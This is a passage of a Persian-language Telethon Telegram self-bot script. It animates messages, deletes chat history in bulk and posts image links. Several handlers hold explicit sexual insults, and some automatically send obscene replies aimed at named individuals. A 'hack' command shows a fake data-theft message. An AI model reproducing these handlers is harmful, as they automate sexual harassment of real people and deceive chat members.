	if event.fwd_from:
		return
	for x in range(1,4):
		for i in range(1,11):
			txt = "➣ " + str(x) + " ❦" * i + " | " + str(10 * i) + "%"
			await event.edit(txt)

@client.on(events.NewMessage(pattern=r'پاکسازی (.*)', outgoing=True))
async def clean(event):
	if event.fwd_from:
		return
	input_str = event.pattern_match.group(1)
	message_id = event.message.id
	for i in range(int(input_str)):
		await client.delete_messages(event.chat_id,message_id)
		message_id -= 1
	await client.send_message(event.chat_id,f"{input_str} мeѕѕαɢeѕ were deleтe . . . !")

@client.on(events.NewMessage(outgoing=True, pattern=r"(بکیرم|به کیرم)"))
async def hert(event):
    bk1 = "\n😂😂😂          😂         😂\n😂         😂      😂       😂\n😂           😂    😂     😂\n😂        😂       😂   😂\n😂😂😂          😂😂\n😂         😂      😂   😂\n😂           😂    😂      😂\n😂           😂    😂        😂\n😂        😂       😂          😂\n😂😂😂          😂            😂\n"
    bk2 = "\n🤤🤤🤤          🤤         🤤\n🤤         🤤      🤤       🤤\n🤤           🤤    🤤     🤤\n🤤        🤤       🤤   🤤\n🤤🤤🤤          🤤🤤\n🤤         🤤      🤤   🤤\n🤤           🤤    🤤      🤤\n🤤           🤤    🤤        🤤\n🤤        🤤       🤤          🤤\n🤤🤤🤤          🤤            🤤\n"
    bk3 = "\n💩💩💩          💩         💩\n💩         💩      💩       💩\n💩           💩    💩     💩\n💩        💩       💩   💩\n💩💩💩          💩💩\n💩         💩      💩   💩\n💩           💩    💩      💩\n💩           💩    💩        💩\n💩        💩       💩          💩\n💩💩💩          💩            💩\n"
    bk4 = "\n🌹🌹🌹          🌹         🌹\n🌹         🌹      🌹       🌹\n🌹           🌹    🌹     🌹\n🌹        🌹       🌹   🌹\n🌹🌹🌹          🌹🌹\n🌹         🌹      🌹   🌹\n🌹           🌹    🌹      🌹\n🌹           🌹    🌹        🌹\n🌹        🌹       🌹          🌹\n🌹🌹🌹          🌹            🌹\n"
    bk5 = "\n💀💀💀          💀         💀\n💀         💀      💀       💀\n💀           💀    💀     💀\n💀        💀       💀   💀\n💀💀💀          💀💀\n💀         💀      💀   💀\n💀           💀    💀      💀\n💀           💀    💀        💀\n💀        💀       💀          💀\n💀💀💀          💀            💀\n"
    bk6 = "\n🌑🌑🌑          🌑         🌑\n🌑         🌑      🌑       🌑\n🌑           🌑    🌑     🌑\n🌑        🌑       🌑   🌑\n🌑🌑🌑          🌑🌑\n🌑         🌑      🌑   🌑\n🌑           🌑    🌑      🌑\n🌑           🌑    🌑        🌑\n🌑        🌑       🌑          🌑\n🌑🌑🌑          🌑            🌑\n"
    bk7 = "\n🌒🌒🌒          🌒         🌒\n🌒         🌒      🌒       🌒\n🌒           🌒    🌒     🌒\n🌒        🌒       🌒   🌒\n🌒🌒🌒          🌒🌒\n🌒         🌒      🌒   🌒\n🌒           🌒    🌒      🌒\n🌒           🌒    🌒        🌒\n🌒        🌒       🌒          🌒\n🌒🌒🌒          🌒            🌒\n"
    bk8 = "\n🌓🌓🌓          🌓         🌓\n🌓         🌓      🌓       🌓\n🌓           🌓    🌓     🌓\n🌓        🌓       🌓   🌓\n🌓🌓🌓          🌓🌓\n🌓         🌓      🌓   🌓\n🌓           🌓    🌓      🌓\n🌓           🌓    🌓        🌓\n🌓        🌓       🌓          🌓\n🌓🌓🌓          🌓            🌓\n"
    bk9 = "\n🌔🌔🌔          🌔         🌔\n🌔         🌔      🌔       🌔\n🌔           🌔    🌔     🌔\n🌔        🌔       🌔   🌔\n🌔🌔🌔          🌔🌔\n🌔         🌔      🌔   🌔\n🌔           🌔    🌔      🌔\n🌔           🌔    🌔        🌔\n🌔        🌔       🌔          🌔\n🌔🌔🌔          🌔            🌔\n"
    bk10 = "\n🌕🌕🌕          🌕         🌕\n🌕         🌕      🌕       🌕\n🌕           🌕    🌕     🌕\n🌕        🌕       🌕   🌕\n🌕🌕🌕          🌕🌕\n🌕         🌕      🌕   🌕\n🌕           🌕    🌕      🌕\n🌕           🌕    🌕        🌕\n🌕        🌕       🌕          🌕\n🌕🌕🌕          🌕            🌕\n"
    bk11 = "\n🌖🌖🌖          🌖         🌖\n🌖         🌖      🌖       🌖\n🌖           🌖    🌖     🌖\n🌖        🌖       🌖   🌖\n🌖🌖🌖          🌖🌖\n🌖         🌖      🌖   🌖\n🌖           🌖    🌖      🌖\n🌖           🌖    🌖        🌖\n🌖        🌖       🌖          🌖\n🌖🌖🌖          🌖            🌖\n"
    bk12 = "\n🌗🌗🌗          🌗         🌗\n🌗         🌗      🌗       🌗\n🌗           🌗    🌗     🌗\n🌗        🌗       🌗   🌗\n🌗🌗🌗          🌗🌗\n🌗         🌗      🌗   🌗\n🌗           🌗    🌗      🌗\n🌗           🌗    🌗        🌗\n🌗        🌗       🌗          🌗\n🌗🌗🌗          🌗            🌗\n"
    bk13 = "\n🌘🌘🌘          🌘         🌘\n🌘         🌘      🌘       🌘\n🌘           🌘    🌘     🌘\n🌘        🌘       🌘   🌘\n🌘🌘🌘          🌘🌘\n🌘         🌘      🌘   🌘\n🌘           🌘    🌘      🌘\n🌘           🌘    🌘        🌘\n🌘        🌘       🌘          🌘\n🌘🌘🌘          🌘            🌘\n"
    bk14 = "\n🌙🌙🌙          🌙         🌙\n🌙         🌙      🌙       🌙\n🌙           🌙    🌙     🌙\n🌙        🌙       🌙   🌙\n🌙🌙🌙          🌙🌙\n🌙         🌙      🌙   🌙\n🌙           🌙    🌙      🌙\n🌙           🌙    🌙        🌙\n🌙        🌙       🌙          🌙\n🌙🌙🌙          🌙            🌙\n"
    bk15 = "\n🪐🪐🪐          🪐         🪐\n🪐         🪐      🪐       🪐\n🪐           🪐    🪐     🪐\n🪐        🪐       🪐   🪐\n🪐🪐🪐          🪐🪐\n🪐         🪐      🪐   🪐\n🪐           🪐    🪐      🪐\n🪐           🪐    🪐        🪐\n🪐        🪐       🪐          🪐\n🪐🪐🪐          🪐            🪐\n"
    await event.edit(bk1)
    await asyncio.sleep(2)
    await event.edit(bk2)
    await asyncio.sleep(2)
    await event.edit(bk3)
    await asyncio.sleep(2)
    await event.edit(bk4)
    await asyncio.sleep(2)
    await event.edit(bk5)
    await asyncio.sleep(2)
    await event.edit(bk6)
    await asyncio.sleep(2)
    await event.edit(bk7)
    await asyncio.sleep(2)
    await event.edit(bk8)
    await asyncio.sleep(2)
    await event.edit(bk9)
    await asyncio.sleep(2)
    await event.edit(bk10)
    await asyncio.sleep(2)
    await event.edit(bk11)
    await asyncio.sleep(2)
    await event.edit(bk12)
    await asyncio.sleep(2)
    await event.edit(bk13)
    await asyncio.sleep(2)
    await event.edit(bk14)
    await asyncio.sleep(2)
    await event.edit(bk15)


@client.on(events.NewMessage(outgoing=True, pattern=r"قلب"))
async def hert(event):
    await event.edit(f"`❤️`")
    await asyncio.sleep(1.2)
    await event.edit(f"`💙`")
    await asyncio.sleep(1.2)
    await event.edit(f"`💜`‌")
    await asyncio.sleep(1.2)
    await event.edit(f"`💚`")
    await asyncio.sleep(1.6)
    await event.edit(f"`💛`")
    await asyncio.sleep(1.2)
    await event.edit(f"`🧡`‌")
    await asyncio.sleep(1.2) 
    await event.edit(f"**i love you**‌")

@client.on(events.NewMessage(outgoing=True, pattern=r"کص مادرت"))
async def hert(event):
    await event.edit(f"`ک‍`")
    await asyncio.sleep(0.8)
    await event.edit(f"کص")
    await asyncio.sleep(0.8)
    await event.edit(f"کص م‍")
    await asyncio.sleep(0.8)
    await event.edit(f"کص ما")
    await asyncio.sleep(0.8)
    await event.edit(f"کص ماد")
    await asyncio.sleep(0.8)
    await event.edit(f"کص مادر")
    await asyncio.sleep(0.8)
    await event.edit(f"کص مادرت")
    await asyncio.sleep(0.8)
    await event.edit(f"ننه جنده")
    await asyncio.sleep(0.8)
    await event.edit(f"کیرم تو کصننت")
    await asyncio.sleep(0.8)
    await event.edit(f"ننه کیر پرست")
    await asyncio.sleep(0.8)
    await event.edit(f"**کص مادرت**")

@client.on(events.NewMessage(outgoing=True, pattern=r"علی"))
async def hert(event):
    await event.edit(f"`ک‍`")
    await asyncio.sleep(0.7)
    await event.edit(f"کی")
    await asyncio.sleep(0.7)
    await event.edit(f"کیر")
    await asyncio.sleep(0.7)
    await event.edit(f"کیرم")
    await asyncio.sleep(0.7)
    await event.edit(f"کیرم ت")
    await asyncio.sleep(0.7)
    await event.edit(f"کیرم تو")
    await asyncio.sleep(0.7)
    await event.edit(f"کیرم تو ک")
    await asyncio.sleep(0.7)
    await event.edit(f"کیرم تو کو")
    await asyncio.sleep(0.7)
    await event.edit(f"کیرم تو کون")
    await asyncio.sleep(0.7)
    await event.edit(f"کیرم تو کون ع")
    await asyncio.sleep(0.7)
    await event.edit(f"کیرم تو کون عل")
    await asyncio.sleep(0.7)
    await event.edit(f"کیرم تو کون علی")
    await asyncio.sleep(0.7)
    await event.edit(f"کیرم تو کون علی ک")
    await asyncio.sleep(0.7)
    await event.edit(f"کیرم تو کون علی کر")
    await asyncio.sleep(0.7)
    await event.edit(f"کیرم تو کون علی کری")
    await asyncio.sleep(0.7)
    await event.edit(f"کیرم تو کون علی کریم")
    await asyncio.sleep(0.7)
    await event.edit(f"کیرم تو کون علی کریمی")
    await asyncio.sleep(0.7)
    await event.edit(f"**کیرم تو کون علی کریمی**")

@client.on(events.NewMessage(outgoing=True, pattern=r"جق بزن"))
async def hert(event):
    await event.edit(f"`B===✊==>>`")
    await asyncio.sleep(0.5)
    await event.edit(f"`B====✊=>>`")
    await asyncio.sleep(0.5)
    await event.edit(f"`B=====✊>>`‌")
    await asyncio.sleep(0.5)
    await event.edit(f"`B====✊=>>`️‌")
    await asyncio.sleep(0.5)
    await event.edit(f"`B===✊==>>`️‌")
    await asyncio.sleep(0.5)
    await event.edit(f"`B==✊===>>`️‌")
    await asyncio.sleep(0.5)
    await event.edit(f"`B=✊====>>`️‌")
    await asyncio.sleep(0.5)
    await event.edit(f"`B✊=====>>`️‌")
    await asyncio.sleep(0.5)
    await event.edit(f"`B=✊====>>`")
    await asyncio.sleep(0.5)
    await event.edit(f"`B==✊===>>`")
    await asyncio.sleep(0.5)
    await event.edit(f"`B===✊==>>`‌")
    await asyncio.sleep(0.5)
    await event.edit(f"`B====✊=>>`️‌")
    await asyncio.sleep(0.5)
    await event.edit(f"`B=====✊>>`️‌")
    await asyncio.sleep(0.5)
    await event.edit(f"`B====✊=>>`️‌")
    await asyncio.sleep(0.5)
    await event.edit(f"`B===✊==>>`️‌")
    await asyncio.sleep(0.5)
    await event.edit(f"`B==✊===>>`️‌")
    await asyncio.sleep(0.5)
    await event.edit(f"B======>>✊💦")

@client.on(events.NewMessage(outgoing=True, pattern=r"سلف هک"))
async def hert(event):
    await event.edit(f"1010101010101010101011101010110101010101010101010111010101101010101010101010101110101011010101010101010101011101010110101010101010101010111010101101010101010101010101110101011010101010101010101011101010110101010101010101010111010101101010101010101010101110101011010101010101010101011101010110101010101010101010111010101101010101010101010101110101011010101010101010101011101010110101010101010101010111010101101010101010101010101110101011010101010101010101011101010110101010101010101010111010101101010101010101010101110101011010101010101010101011101010110101010101010101010111010101010110101010\nLoading.")
    await asyncio.sleep(0.9)
    await event.edit(f"1010100101010110001011111010010000101101001001000010111001111110001101011000111110101010101010010101001011111010010000101101001001000010111001111110001101011000111110101010101010010101001011111010010000101101001001000010111001111110001101011000111110101010101010010101001011111010010000101101001001000010111001111110001101011000111110101010101010010101001011111010010000101101001001000010111001111110001101011000111110101010101010010101001011111010010000101101001001000010111001111110001101011000111110101010101010010101001011111010010000101101001001000010111001111110001101011000111110101010\nLoading..")
    await asyncio.sleep(0.9)
    await event.edit(f"1010101100101010101010101110101011010101010101010101011101010110101010101010101010111010101101010101010101010101110101011010101010101010101011101010110101010101010101010111010101101010101010101010101110101011010101010101010101011101010110101010101010101010111010101101010101010101010101110101011010101010101010101011101010110101010101010101010111010101101010101010101010101110101011010101010101010101011101010110101010101010101010111010101101010101010101010101110101011010101010101010101011101010110101010101010101010111010101101010101010101010101110101011010101010101010101011101010110101010\nLoading...")
    await asyncio.sleep(0.9)
    await event.edit(f"1010100101000111001011111010010000101101001001000010111001111110001101011000111110101010101010010101001011111010010000101101001001000010111001111110001101011000111110101010101010010101001011111010010000101101001001000010111001111110001101011000111110101010101010010101001011111010010000101101001001000010111001111110001101011000111110101010101010010101001011111010010000101101001001000010111001111110001101011000111110101010101010010101001011111010010000101101001001000010111001111110001101011000111110101010101010010101001011111010010000101101001001000010111001111110001101011000111110101010\nLoading..")
    await asyncio.sleep(0.9)
    await event.edit(f"1010101010101001001010101110101011010101010101010101011101010110101010101010101010111010101101010101010101010101110101011010101010101010101011101010110101010101010101010111010101101010101010101010101110101011010101010101010101011101010110101010101010101010111010101101010101010101010101110101011010101010101010101011101010110101010101010101010111010101101010101010101010101110101011010101010101010101011101010110101010101010101010111010101101010101010101010101110101011010101010101010101011101010110101010101010101010111010101101010101010101010101110101011010101010101010101011101010110101010\nLoading.")
    await asyncio.sleep(0.9)
    await event.edit(f"1010001110010101001011111010010000101101001001000010111001111110001101011000111110101010101010010101001011111010010000101101001001000010111001111110001101011000111110101010101010010101001011111010010000101101001001000010111001111110001101011000111110101010101010010101001011111010010000101101001001000010111001111110001101011000111110101010101010010101001011111010010000101101001001000010111001111110001101011000111110101010101010010101001011111010010000101101001001000010111001111110001101011000111110101010101010010101001011111010010000101101001001000010111001111110001101011000111110101010\nLoading...")
    await asyncio.sleep(0.9)
    await event.edit(f"**All information has been sent to Sio Messenger!\nتمامی اطلاعات سلف کاربر به سیو مسیج ارسال شد!**‌")   

@client.on(events.NewMessage)

async def main(event):



    user_id = event.sender_id

    if(user_id == AdminBot):

        text = event.raw_text

        if(text in ["قیافه علی کریمی 8"]):

            await client.send_message(event.chat_id, f"https://imgurl.ir/uploads/u23244_IMG_20240813_224058_856.jpg")

            await asyncio.sleep(0.1)

            await client.delete_messages(event.chat_id, [event.message])


@client.on(events.NewMessage)

async def main(event):



    user_id = event.sender_id

    if(user_id == AdminBot):

        text = event.raw_text

        if(text in ["عکس گیگاچد"]):

            await client.send_message(event.chat_id, f"https://imgurl.ir/uploads/t39324_5319d46f23712d346ce73b963210f719.jpg")

            await asyncio.sleep(0.1)

            await client.delete_messages(event.chat_id, [event.message])                                       
                                                                                                 
@client.on(events.NewMessage(outgoing=False, pattern=r"(.*) مهدی (.*)"))
async def m(event):
        await event.reply(f"**یک پیام از طرف ربات: کیرم دهن مهدی**")
         
@client.on(events.NewMessage(outgoing=False, pattern=r"مهدی(.*)"))
async def m(event):
        await event.reply(f"**یک پیام از طرف ربات: کیرم دهن مهدی**")

@client.on(events.NewMessage(outgoing=False, pattern=r"(.*) علی (.*)"))
async def m(event):
        await event.reply(f"**یک پیام از طرف ربات: کون علی کریمی را نوازش کردم آیا شما هم دوست دارید نوازش کنید؟**")
         
@client.on(events.NewMessage(outgoing=False, pattern=r"علی(.*)"))
async def m(event):
        await event.reply(f"**یک پیام از طرف ربات: کون علی کریمی را نوازش کردم آیا شما هم دوست دارید نوازش کنید؟**")                                              
@client.on(events.NewMessage(outgoing=False, pattern=r"(.*) ابوالفضل (.*)"))
async def m(event):
        await event.reply(f"**یک پیام از طرف ربات: به نظر می رسد سلطان سکندر نشان سلیمان مکان در حال حاضر آنلاین نیست! من به ایشان اطلاع داده و در اسرع وقت آنلاین می شوند.**")
         
@client.on(events.NewMessage(outgoing=False, pattern=r"ابوالفضل(.*)"))
async def m(event):
        await event.reply(f"**یک پیام از طرف ربات: به نظر می رسد سلطان سکندر نشان سلیمان مکان در حال حاضر آنلاین نیست! من به ایشان اطلاع داده و در اسرع وقت آنلاین می شوند.**")                                                                                          @client.on(events.NewMessage(outgoing=False, pattern=r"(*.) ابولی (.*)"))
async def m(event):
        await event.reply(f"https://t.me/gif9443/3")
         
@client.on(events.NewMessage(outgoing=False, pattern=r"ابولی(.*)"))
async def m(event):
        await event.reply(f"https://t.me/gif9443/3")      
@client.on(events.NewMessage(outgoing=False, pattern=r"(.*) ابلفضل (.*)"))
async def m(event):
        await event.reply(f"https://t.me/gif9443/3")
         
@client.on(events.NewMessage(outgoing=False, pattern=r"ابلفضل(.*)"))
async def m(event):
        await event.reply(f"https://t.me/gif9443/3")      

@client.on(events.NewMessage(outgoing=False, pattern=r"کصکش"))
async def m(event):
        await event.reply(f"https://t.me/gif9443/2")       

@client.on(events.NewMessage(pattern=r"علی کریمی کیست؟"))
async def m(event):
        await event.reply(f"https://t.me/gif9443/5")        
                        
@client.on(events.NewMessage(outgoing=True, pattern=r"کاکاسنگی"))
async def hert(event):                
        await event.edit(f"َ                         ⡠⠒⠉⠉⠉⠉⠉⠉⠓⢆⠀ ⠀⠀⠀⠀⠀⠀⠀⢠⣾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠘⢢ ⠀⠀⠀⠀⠀⠀⣠⣿⣿⣷⣿⣶⣶⣄⡀⠀⠀⠀⠀⢸ ⠀⠀⠀⠀⠀⠀⣿⣿⣿⠿⢿⣿⣿⣿⣿⣆⠀⠀⠀⢸ ⠀⠀⠀⠀⠀⠀⣹⣿⠋⠀⠀⢿⣿⡿⠿⠋⠁⠀⠀⡜ ⠀⠀⠀⠀⠀⣴⡿⠁⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⡇ ⠀⠀⠀⢀⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃ ⠀⠀⢠⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀ ⠀⠀⢷⣶⣦⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀ ⠀⠀⣼⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⣀⠀⢰⠁⠀ ⠀⢀⣿⣿⣯⣍⠁⠀⠀⠀⠀⠀⠀⠀⠀⣿⠿⠋⠀⠀ ⠀⢸⣿⣿⣿⣷⣶⠂⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀ ⠀⣼⣿⡿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀ ⢠⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡔⡅⠀⠀⠀⠀ ⣾⡟⠀⠀⠀⠀⠀⠀⢀⣀⣤⣶⡿⠋⠀⠘⢄⠀⠀⠀ ⠉⠛⢷⣶⣶⣶⣾⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⢣⠀⠀ ⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⢇⠀ ⠀⣼⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⢀⡠⠞⠀ ⢰⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⣀⠤⠒⠉⠀⠀⠀ ⣿⣿⣿⣿⣿⣿⠋⠀⠀⣀⠠⠐⠈⠀⠀⠀⠀⠀⠀⠀ ⠈⠛⠿⢿⣿⣃⡤⠖⠋⠁⠀")
        
@client.on(events.NewMessage(outgoing=True, pattern=r"🗿"))
async def hert(event):                
        await event.edit(f"َ                         ⡠⠒⠉⠉⠉⠉⠉⠉⠓⢆⠀ ⠀⠀⠀⠀⠀⠀⠀⢠⣾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠘⢢ ⠀⠀⠀⠀⠀⠀⣠⣿⣿⣷⣿⣶⣶⣄⡀⠀⠀⠀⠀⢸ ⠀⠀⠀⠀⠀⠀⣿⣿⣿⠿⢿⣿⣿⣿⣿⣆⠀⠀⠀⢸ ⠀⠀⠀⠀⠀⠀⣹⣿⠋⠀⠀⢿⣿⡿⠿⠋⠁⠀⠀⡜ ⠀⠀⠀⠀⠀⣴⡿⠁⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⡇ ⠀⠀⠀⢀⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃ ⠀⠀⢠⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀ ⠀⠀⢷⣶⣦⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀ ⠀⠀⣼⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⣀⠀⢰⠁⠀ ⠀⢀⣿⣿⣯⣍⠁⠀⠀⠀⠀⠀⠀⠀⠀⣿⠿⠋⠀⠀ ⠀⢸⣿⣿⣿⣷⣶⠂⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀ ⠀⣼⣿⡿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀ ⢠⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡔⡅⠀⠀⠀⠀ ⣾⡟⠀⠀⠀⠀⠀⠀⢀⣀⣤⣶⡿⠋⠀⠘⢄⠀⠀⠀ ⠉⠛⢷⣶⣶⣶⣾⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⢣⠀⠀ ⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⢇⠀ ⠀⣼⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⢀⡠⠞⠀ ⢰⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⣀⠤⠒⠉⠀⠀⠀ ⣿⣿⣿⣿⣿⣿⠋⠀⠀⣀⠠⠐⠈⠀⠀⠀⠀⠀⠀⠀ ⠈⠛⠿⢿⣿⣃⡤⠖⠋⠁⠀")        

@client.on(events.NewMessage(outgoing=True, pattern=r"گیگاچد"))
async def hert(event):                
        await event.edit(f"َ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣶⣶⣶⣶⣶⣤⡄⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⠉⠉⠉⠉⠉⠙⢢⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⢘⡉⢻⡇⠀⠀⠀⠀⠀⠀⠀⠀⢐⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠳⡦⣸⣷⣄⡀⢀⣀⡀⠀⠀⠀⡂⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⡊⣿⣿⣿⣿⣯⡩⣉⠹⢷⢦⠁⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⢰⠀⢻⣿⣿⣿⣿⣿⣿⣶⣶⡞⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⢀⡌⠀⠀⢀⠉⠻⣿⣿⣿⣿⣿⡇⠀⠀⠀ ⠀⣀⠠⠤⠐⠚⠱⠀⠀⠀⠈⠀⠀⠀⠉⣻⠛⠋⠀⠀⠀⠀ ⡇⠀⠀⡊⠠⠐⠁⠀⠀⠀⠀⢰⠀⢀⠆⠿⡀⠀⠀⠀⠀⠀ ⡗⠒⠒⠀⠀⠀⠠⠤⢤⡀⠀⢸⠀⠘⠀⠀⢌⠑⢢⠀⠀⠀ ⡇⠠⠀⠀⠀⠀⠀⠀⠀⠀⠑⢺⠀⠐⠀⠀⠂⠀⠀⠉⠒⠢ ⡇⠀⠀⠀⠀⠀⠀⠂⢰⠤⠀⠀⢦⠁⠀⠀⢂⠀⠀⠐⠄⠀ ⠈⠉⠑⠦⡀ ⡇⠀⡀⢀⠐⡀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀ ⠁⠄⠀⠀⠘")



nnn_list = []

@client.on(events.NewMessage(pattern=r"ن(.*)" , from_users=AdminBot))
async def add_name(event):
    if event.fwd_from:
        return
    input_str = event.pattern_match.group(1)
    xxx = (input_str)
    if (xxx) in nnn_list:
        await event.edit(f"َ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣶⣶⣶⣶⣶⣤⡄⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⠉⠉⠉⠉⠉⠙⢢⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⢘⡉⢻⡇⠀⠀⠀⠀⠀⠀⠀⠀⢐⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠳⡦⣸⣷⣄⡀⢀⣀⡀⠀⠀⠀⡂⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⡊⣿⣿⣿⣿⣯⡩⣉⠹⢷⢦⠁⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⢰⠀⢻⣿⣿⣿⣿⣿⣿⣶⣶⡞⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⢀⡌⠀⠀⢀⠉⠻⣿⣿⣿⣿⣿⡇⠀⠀⠀ ⠀⣀⠠⠤⠐⠚⠱⠀⠀⠀⠈⠀⠀⠀⠉⣻⠛⠋⠀⠀⠀⠀ ⡇⠀⠀⡊⠠⠐⠁⠀⠀⠀⠀⢰⠀⢀⠆⠿⡀⠀⠀⠀⠀⠀ ⡗⠒⠒⠀⠀⠀⠠⠤⢤⡀⠀⢸⠀⠘⠀⠀⢌⠑⢢⠀⠀⠀ ⡇⠠⠀⠀⠀⠀⠀⠀⠀⠀⠑⢺⠀⠐⠀⠀⠂⠀⠀⠉⠒⠢ ⡇⠀⠀⠀⠀⠀⠀⠂⢰⠤⠀⠀⢦⠁⠀⠀⢂⠀⠀⠐⠄⠀ ⠈⠉⠑⠦⡀ ⡇⠀⡀⢀⠐⡀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀ ⠁⠄⠀⠀⠘.                                                                                               َ                                **ن{xxx}**")
    else:
        try:
            nnn_list.append(xxx)
            await event.edit(f"َ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣶⣶⣶⣶⣶⣤⡄⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⠉⠉⠉⠉⠉⠙⢢⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⢘⡉⢻⡇⠀⠀⠀⠀⠀⠀⠀⠀⢐⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠳⡦⣸⣷⣄⡀⢀⣀⡀⠀⠀⠀⡂⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⡊⣿⣿⣿⣿⣯⡩⣉⠹⢷⢦⠁⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⢰⠀⢻⣿⣿⣿⣿⣿⣿⣶⣶⡞⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⢀⡌⠀⠀⢀⠉⠻⣿⣿⣿⣿⣿⡇⠀⠀⠀ ⠀⣀⠠⠤⠐⠚⠱⠀⠀⠀⠈⠀⠀⠀⠉⣻⠛⠋⠀⠀⠀⠀ ⡇⠀⠀⡊⠠⠐⠁⠀⠀⠀⠀⢰⠀⢀⠆⠿⡀⠀⠀⠀⠀⠀ ⡗⠒⠒⠀⠀⠀⠠⠤⢤⡀⠀⢸⠀⠘⠀⠀⢌⠑⢢⠀⠀⠀ ⡇⠠⠀⠀⠀⠀⠀⠀⠀⠀⠑⢺⠀⠐⠀⠀⠂⠀⠀⠉⠒⠢ ⡇⠀⠀⠀⠀⠀⠀⠂⢰⠤⠀⠀⢦⠁⠀⠀⢂⠀⠀⠐⠄⠀ ⠈⠉⠑⠦⡀ ⡇⠀⡀⢀⠐⡀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀ ⠁⠄⠀⠀⠘.                                                                                               َ                                **ن{xxx}**")
        except:
            await event.edit("**No Invalid . . . !**")

@client.on(events.NewMessage(outgoing=True, pattern=r"ترول فیس"))
async def hert(event):                
        await event.edit(f"َ⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀       ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀                        ⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇                                ⢤⣀⣀⣀  ⢸⣷⡄ ⣁⣀⣤⣴⣿⣿⣿⣆                              ⠹⠏   ⣿⣧ ⠹⣿⣿⣿⣿⣿⡿⣿                               ⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟                                    ⠦⠴⢿⢿⣿⡿⠷ ⣿                                     ⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃                              ⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿                                                         ⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇                                      ⠙⠻⢿⣿⣿⣿⣿⠟⠁")



asheq_list = []

@client.on(events.NewMessage(from_users=AdminBot))
async def _(event):
    if event.raw_text.lower() == "تنظیم عشق":
        chat = await event.get_chat()
        replied = await event.get_reply_message()
        sender = replied.sender
        xxx = int("{}".format(sender.id))
        if int(xxx) in asheq_list:
            await event.edit("**این کاربر در حال حاضر در لیست عاشقان است!**".format(sender.first_name , sender.id))
        else:
            try:
                asheq_list.append(int(xxx))
                await event.edit("**کاربر به لیست عاشقان اضافه شد!**".format(sender.first_name , sender.id))
            except:
                await event.edit("**No Invalid . . . !**")
    elif event.raw_text.lower() == "حذف عشق":
        chat = await event.get_chat()
        replied = await event.get_reply_message()
        sender = replied.sender
